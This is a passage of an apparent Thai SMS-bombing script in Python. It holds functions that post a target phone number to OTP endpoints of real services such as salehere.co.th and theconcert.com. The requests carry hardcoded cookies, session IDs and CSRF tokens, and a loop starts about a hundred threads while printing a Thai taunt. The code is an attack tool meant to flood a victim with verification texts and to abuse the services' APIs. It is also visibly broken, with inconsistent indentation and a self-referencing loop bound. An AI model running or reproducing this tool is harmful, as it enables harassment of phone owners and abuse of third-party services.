"_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api99():
head = {
	"content-type": "application/json",
	"accept": "*/*",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
	"referer": "https://salehere.co.th/",
	"cookie": "_fbp=fb.2.1648385201793.1379988974;_gid=GA1.3.1234211865.1648385203;_gat_UA-118968627-9=1;__utma=195884718.1573510301.1648385203.1648385203.1648385203.1;__utmc=195884718;__utmz=195884718.1648385203.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided);__utmt_%5Bobject%20Object%5D=1;G_ENABLED_IDPS=google;__utmb=195884718.2.10.1648385203;_ga_TQ163J47DR=GS1.1.1648385205.1.0.1648385205.0;_ga=GA1.1.1573510301.1648385203"
	    }
	requests.post("https://api.salehere.co.th/graphql",headers=head,json={"operationName":"sendUserOTPV2","variables":{"tel":phone,"token":""},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}})
	

def api100():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

for number in range(1, number):
    threading.Thread(target=api1).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api2).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api3).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api4).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api5).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api6).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api7).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api8).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api9).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api10).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api11).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api12).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api13).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api14).start() 
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api15).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api16).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api17).start()
    print("\033[31mยิงแล้งน้อง")
    threading.Thread(target=api18).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api19).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api20).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api21).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api22).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api23).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api24).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api25).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api26).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api27).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api28).start() 
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api29).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api30).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api31).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api32).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api33).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api34).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api35).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api36).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api37).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api38).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api39).start()
   print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api40).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api41).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api42).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api43).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api44).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api45).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api46).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api47).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api48).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api49).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api50).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api51).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api52).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api53).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api54).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api55).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api56).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api57).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api58).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api59).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api60).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api61).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api62).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api63).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api64).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api65).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api66).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api67).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api68).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api69).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api70).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api71).start() 
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api72).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api74).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api75).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api76).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api77).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api78).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api79).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api80).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api82).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api83).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api84).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api85).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api86).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api87).start() 
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api88).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api89).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api90).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api92).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api93).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api94).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api95).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api96).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api97).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api98).start()
    print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api99).start()
   print("\033[31mยิงแล้วน้อง")
    threading.Thread(target=api100).start()
    print("\033[31mยิงแล้วน้อง")
   